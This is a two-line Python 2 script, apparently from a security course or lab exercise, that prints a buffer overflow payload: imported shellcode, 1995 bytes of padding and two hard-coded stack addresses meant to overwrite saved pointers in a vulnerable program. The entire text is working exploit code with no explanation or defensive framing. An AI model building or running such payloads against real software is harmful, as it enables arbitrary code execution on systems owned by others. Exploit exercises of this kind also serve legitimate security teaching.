from shellcode import shellcode
print shellcode+"a"*1995+"\x68"+"\x69"+"\xfe"+"\xbf"+"\x7c"+"\x71"+"\xfe"+"\xbf";
